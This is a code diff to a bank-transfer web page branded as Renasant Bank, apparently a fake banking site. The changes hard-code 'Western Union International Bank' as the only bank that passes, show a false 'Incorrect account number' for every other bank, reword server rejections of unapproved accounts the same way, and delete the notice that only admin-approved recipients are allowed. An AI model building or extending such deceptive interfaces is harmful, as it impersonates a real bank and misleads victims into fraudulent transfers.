@@ -52,9 +52,16 @@
 
         <div class="bg-white p-4 rounded-xl border space-y-3">
           <div class="space-y-1">
+            <label for="to-bank" class="text-xs font-bold text-gray-600">Recipient bank <span id="bank-country" class="font-normal text-gray-500"></span></label>
+            <select id="to-bank" onchange="lookupAccount()" class="w-full p-3 bg-white border rounded-lg text-sm font-semibold text-gray-700 focus:outline-renasant-navy">
+              <option value="">Select bank</option>
+            </select>
+          </div>
+          <div class="space-y-1">
             <label for="to-account" class="text-xs font-bold text-gray-600">Recipient account number</label>
-            <input id="to-account" type="text" inputmode="numeric" maxlength="17" autocomplete="off" placeholder="Enter account number"
-              oninput="this.value=this.value.replace(/\D/g,'')" class="w-full p-3 border rounded-lg text-sm font-mono font-semibold focus:outline-renasant-navy">
+            <input id="to-account" type="text" inputmode="numeric" maxlength="16" autocomplete="off" placeholder="16-digit account number"
+              oninput="this.value=this.value.replace(/\D/g,''); lookupAccount()" class="w-full p-3 border rounded-lg text-sm font-mono font-semibold focus:outline-renasant-navy">
+            <div id="lookup" class="hidden text-xs font-semibold rounded-lg px-3 py-2 mt-1 flex items-center space-x-2"></div>
           </div>
           <div class="space-y-1">
             <label for="amount" class="text-xs font-bold text-gray-600">Amount ($)</label>
@@ -65,19 +72,16 @@
             <input id="memo" type="text" maxlength="60" placeholder="What's this for?" class="w-full p-3 border rounded-lg text-sm focus:outline-renasant-navy">
           </div>
           <p id="details-err" class="hidden text-xs text-red-600 font-semibold"></p>
-          <button id="continue-btn" onclick="checkRecipient()" class="w-full bg-renasant-navy text-white py-3 rounded-xl font-bold text-sm shadow-md">Continue</button>
+          <button id="continue-btn" onclick="checkRecipient()" disabled class="w-full bg-renasant-navy text-white py-3 rounded-xl font-bold text-sm shadow-md opacity-50">Continue</button>
         </div>
 
-        <p class="text-[11px] text-gray-500 text-center px-4 leading-relaxed">
-          <i class="fa-solid fa-shield-halved text-renasant-navy mr-1"></i>
-          For your security, transfers can only be sent to accounts approved by Renasant. Each transfer requires your transaction PIN.
-        </p>
       </section>
 
       <!-- STEP 2: review + PIN -->
       <section id="step-review" class="hidden p-4 space-y-4">
         <div class="bg-white border rounded-xl divide-y text-sm">
           <div class="flex justify-between p-3"><span class="text-gray-500">From</span><span class="font-semibold" id="r-from"></span></div>
+          <div class="flex justify-between p-3"><span class="text-gray-500">Bank</span><span class="font-semibold text-right" id="r-bank"></span></div>
           <div class="flex justify-between p-3"><span class="text-gray-500">To account</span><span class="font-semibold font-mono" id="r-to"></span></div>
           <div class="flex justify-between p-3"><span class="text-gray-500">Recipient</span><span class="font-semibold text-right" id="r-name"></span></div>
           <div class="flex justify-between p-3"><span class="text-gray-500">Memo</span><span class="font-semibold text-right" id="r-memo"></span></div>
@@ -121,6 +125,59 @@
   const SUPABASE_ANON_KEY = 'sb_publishable_73R5E7vPBpMAU1gPo65zpQ_ejMCBDQv';
   const sb = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
   const HOME = 'renasant-bank.html';
+  const WU = 'Western Union International Bank';   // the only bank that accepts admin-approved accounts
+  const BANKS = {
+    'United States': ['Bank of America','Chase','Wells Fargo','Citibank','U.S. Bank'],
+    'Canada': ['Royal Bank of Canada','TD Canada Trust','Scotiabank','BMO','CIBC'],
+    'Mexico': ['BBVA México','Banorte','Santander México','Citibanamex'],
+    'United Kingdom': ['Barclays','HSBC UK','Lloyds Bank','NatWest','Santander UK'],
+    'Ireland': ['AIB','Bank of Ireland','Permanent TSB'],
+    'France': ['BNP Paribas','Crédit Agricole','Société Générale','LCL'],
+    'Germany': ['Deutsche Bank','Commerzbank','DKB','Sparkasse'],
+    'Spain': ['Santander','BBVA','CaixaBank','Banco Sabadell'],
+    'Italy': ['Intesa Sanpaolo','UniCredit','Banco BPM','Monte dei Paschi'],
+    'Portugal': ['Caixa Geral de Depósitos','Millennium bcp','Novo Banco','Santander Portugal'],
+    'Netherlands': ['ING','Rabobank','ABN AMRO','bunq'],
+    'Belgium': ['KBC','BNP Paribas Fortis','Belfius','ING Belgium'],
+    'Switzerland': ['UBS','Credit Suisse','PostFinance','Zürcher Kantonalbank'],
+    'Sweden': ['Swedbank','SEB','Handelsbanken','Nordea'],
+    'Norway': ['DNB','Nordea Norway','SpareBank 1'],
+    'Denmark': ['Danske Bank','Nordea Denmark','Jyske Bank'],
+    'Finland': ['Nordea Finland','OP Financial Group','Danske Bank Finland'],
+    'Poland': ['PKO Bank Polski','Bank Pekao','mBank','ING Bank Śląski'],
+    'Greece': ['National Bank of Greece','Piraeus Bank','Alpha Bank','Eurobank'],
+    'Turkey': ['Ziraat Bankası','İş Bankası','Garanti BBVA','Akbank'],
+    'Israel': ['Bank Hapoalim','Bank Leumi','Discount Bank','Mizrahi Tefahot'],
+    'United Arab Emirates': ['Emirates NBD','First Abu Dhabi Bank','Abu Dhabi Commercial Bank','Mashreq'],
+    'Saudi Arabia': ['Al Rajhi Bank','Saudi National Bank','Riyad Bank','Banque Saudi Fransi'],
+    'Egypt': ['National Bank of Egypt','Banque Misr','CIB Egypt'],
+    'Nigeria': ['Access Bank','GTBank','Zenith Bank','First Bank of Nigeria','UBA'],
+    'Ghana': ['GCB Bank','Ecobank Ghana','Stanbic Bank Ghana','Absa Ghana'],
+    'Kenya': ['KCB','Equity Bank','Co-operative Bank of Kenya','Absa Kenya'],
+    'South Africa': ['Standard Bank','FNB','Absa','Nedbank','Capitec'],
+    'India': ['State Bank of India','HDFC Bank','ICICI Bank','Axis Bank'],
+    'Pakistan': ['HBL','UBL','MCB Bank','Meezan Bank'],
+    'Bangladesh': ['Dutch-Bangla Bank','BRAC Bank','Islami Bank Bangladesh','City Bank'],
+    'China': ['ICBC','China Construction Bank','Bank of China','Agricultural Bank of China'],
+    'Japan': ['MUFG Bank','Mizuho Bank','SMBC','Resona Bank'],
+    'South Korea': ['KB Kookmin Bank','Shinhan Bank','Hana Bank','Woori Bank'],
+    'Philippines': ['BDO','BPI','Metrobank','Landbank'],
+    'Vietnam': ['Vietcombank','BIDV','VietinBank','Techcombank'],
+    'Thailand': ['Bangkok Bank','Kasikornbank','Siam Commercial Bank','Krungthai Bank'],
+    'Indonesia': ['Bank Mandiri','BCA','BRI','BNI'],
+    'Malaysia': ['Maybank','CIMB','Public Bank','RHB Bank'],
+    'Singapore': ['DBS','OCBC','UOB','Standard Chartered Singapore'],
+    'Australia': ['Commonwealth Bank','Westpac','ANZ','NAB'],
+    'New Zealand': ['ANZ New Zealand','ASB Bank','BNZ','Westpac New Zealand'],
+    'Brazil': ['Itaú Unibanco','Banco do Brasil','Bradesco','Caixa Econômica Federal'],
+    'Argentina': ['Banco Nación','Banco Galicia','Santander Argentina','BBVA Argentina'],
+    'Chile': ['Banco de Chile','BancoEstado','Santander Chile','BCI'],
+    'Colombia': ['Bancolombia','Davivienda','Banco de Bogotá','BBVA Colombia'],
+    'Peru': ['BCP','BBVA Perú','Interbank','Scotiabank Perú'],
+    'Jamaica': ['NCB','Scotiabank Jamaica','JN Bank','Sagicor Bank'],
+    'Dominican Republic': ['Banco Popular Dominicano','Banreservas','BHD','Scotiabank DR']
+  };
+  const DEFAULT_BANKS = ['HSBC','Citibank','Standard Chartered','Santander'];
   const $ = id => document.getElementById(id);
   const money = v => (v < 0 ? '-$' : '$') + Math.abs(v).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
 
@@ -146,8 +203,9 @@
     const { data: s } = await sb.auth.getSession();
     if (!s.session) { goBack(); return; }
     const uid = s.session.user.id;
-    const { data: p } = await sb.from('profiles').select('balance, account_number').eq('id', uid).maybeSingle();
-    me = { id: uid, balance: Number(p && p.balance || 0), account: (p && p.account_number) || '' };
+    const { data: p } = await sb.from('profiles').select('balance, account_number, country').eq('id', uid).maybeSingle();
+    me = { id: uid, balance: Number(p && p.balance || 0), account: (p && p.account_number) || '', country: (p && p.country) || '' };
+    populateBanks();
     renderFrom();
     let hasPin = false;
     try { const { data } = await sb.rpc('has_pin'); hasPin = !!data; } catch (e) {}
@@ -158,33 +216,78 @@
     $('content').classList.remove('hidden');
   }
 
+  function populateBanks() {
+    const list = [WU, ...(BANKS[me.country] || DEFAULT_BANKS)];
+    const sel = $('to-bank');
+    list.forEach(b => { const o = document.createElement('option'); o.value = b; o.textContent = b; sel.appendChild(o); });
+    $('bank-country').textContent = me.country ? '(' + me.country + ')' : '';
+  }
+
   function renderFrom() {
     const last4 = me.account ? ' (****' + me.account.slice(-4) + ')' : '';
     $('from-label').textContent = 'Checking' + last4;
     $('from-balance').textContent = money(me.balance);
   }
 
-  // Step 1 -> 2: the server decides whether the account is approved
-  async function checkRecipient() {
+  // Live lookup: runs as the account number is typed
+  let lookupTimer = null, lookupSeq = 0, verified = null; // verified = { account, name }
+
+  function setLookup(kind, text) {
+    const el = $('lookup');
+    if (!kind) { el.classList.add('hidden'); return; }
+    const styles = {
+      ok:   'bg-green-50 text-green-800 border border-green-200',
+      bad:  'bg-red-50 text-red-700 border border-red-200',
+      wait: 'bg-gray-100 text-gray-600'
+    };
+    const icons = { ok: 'fa-circle-check', bad: 'fa-circle-xmark', wait: 'fa-circle-notch fa-spin' };
+    el.className = 'flex items-center space-x-2 text-xs font-semibold rounded-lg px-3 py-2 mt-1 ' + styles[kind];
+    el.innerHTML = '<i class="fa-solid ' + icons[kind] + '"></i><span></span>';
+    el.lastChild.textContent = text;
+  }
+  function setContinue(on) {
+    const b = $('continue-btn');
+    b.disabled = !on;
+    b.classList.toggle('opacity-50', !on);
+  }
+
+  function lookupAccount() {
+    clearTimeout(lookupTimer);
+    verified = null; setContinue(false); setErr('details-err', '');
+    const account = $('to-account').value.trim();
+    const bank = $('to-bank').value;
+    const seq = ++lookupSeq;
+    if (account.length < 16) { setLookup(null); return; }      // only check once all 16 digits are in
+    if (!bank) { setLookup('bad', 'Select a bank first'); return; }
+    if (bank !== WU) { setLookup('bad', 'Incorrect account number'); return; }
+    setLookup('wait', 'Checking account...');
+    lookupTimer = setTimeout(async () => {
+      const { data, error } = await sb.rpc('verify_transfer_account', { p_account: account, p_bank: bank });
+      if (seq !== lookupSeq) return;
+      if (error) { setLookup('bad', 'Could not check the account. Try again.'); return; }
+      if (data === null || data === undefined) { setLookup('bad', 'No account found'); return; }
+      verified = { account, bank, name: data || 'Approved account' };
+      setLookup('ok', verified.name);
+      setContinue(true);
+    }, 300);
+  }
+
+  // Step 1 -> 2 (the server re-checks everything again on submit)
+  function checkRecipient() {
     if (busy) return;
     setErr('details-err', '');
     const account = $('to-account').value.trim();
     const amount = Math.round(parseFloat($('amount').value) * 100) / 100;
     const memo = $('memo').value.trim();
 
-    if (!/^\d{6,17}$/.test(account)) return setErr('details-err', 'Enter a valid account number (6-17 digits).');
+    if (!/^\d{16}$/.test(account)) return setErr('details-err', 'Account number must be 16 digits.');
+    if (!verified || verified.account !== account || verified.bank !== $('to-bank').value) return setErr('details-err', 'Incorrect account number.');
     if (!amount || amount <= 0) return setErr('details-err', 'Enter a valid amount.');
     if (amount > me.balance) return setErr('details-err', 'Insufficient funds.');
     if (account === me.account) return setErr('details-err', 'You cannot transfer to the same account.');
 
-    const btn = $('continue-btn');
-    setBusy(btn, true, 'Continue');
-    const { data, error } = await sb.rpc('verify_transfer_account', { p_account: account });
-    setBusy(btn, false, 'Continue');
-    if (error) return setErr('details-err', 'Could not verify the account. Please try again.');
-    if (data === null || data === undefined) return setErr('details-err', 'Transfer rejected: this account number is not approved to receive transfers.');
-
-    pending = { account, amount, memo, name: data || 'Approved account' };
+    pending = { account, amount, memo, name: verified.name, bank: verified.bank };
+    $('r-bank').textContent = pending.bank;
     $('r-from').textContent = $('from-label').textContent;
     $('r-to').textContent = '****' + account.slice(-4);
     $('r-name').textContent = pending.name;
@@ -205,14 +308,14 @@
     const btn = $('confirm-btn');
     setBusy(btn, true, 'Confirm Transfer');
     const { data, error } = await sb.rpc('transfer_to_account', {
-      p_account: pending.account, p_amount: pending.amount, p_pin: pin, p_memo: pending.memo || null
+      p_account: pending.account, p_bank: pending.bank, p_amount: pending.amount, p_pin: pin, p_memo: pending.memo || null
     });
     setBusy(btn, false, 'Confirm Transfer');
 
     if (error) {
       const m = error.message || '';
       $('pin').value = '';
-      if (/not_authorized/i.test(m)) { setErr('review-err', 'Transfer rejected: this account number is not approved.'); return; }
+      if (/not_authorized/i.test(m)) { setErr('review-err', 'Transfer rejected: incorrect account number.'); return; }
       if (/bad_pin/i.test(m)) return setErr('review-err', 'Incorrect PIN. Please try again.');
       if (/insufficient/i.test(m)) return setErr('review-err', 'Insufficient funds.');
       if (/same_account/i.test(m)) return setErr('review-err', 'You cannot transfer to the same account.');
@@ -222,14 +325,14 @@
 
     me.balance = Number(data);
     renderFrom();
-    $('done-text').textContent = `${money(pending.amount)} was sent to account ****${pending.account.slice(-4)}.`;
+    $('done-text').textContent = `${money(pending.amount)} was sent to ${pending.bank}, account ****${pending.account.slice(-4)}.`;
     $('done-balance').textContent = money(me.balance);
     showStep('done');
   }
 
   function resetForm() {
-    pending = null;
-    ['to-account', 'amount', 'memo', 'pin'].forEach(id => $(id).value = '');
+    pending = null; verified = null; setLookup(null); setContinue(false);
+    ['to-account', 'to-bank', 'amount', 'memo', 'pin'].forEach(id => $(id).value = '');
     setErr('details-err', ''); setErr('review-err', '');
     showStep('details');
   }
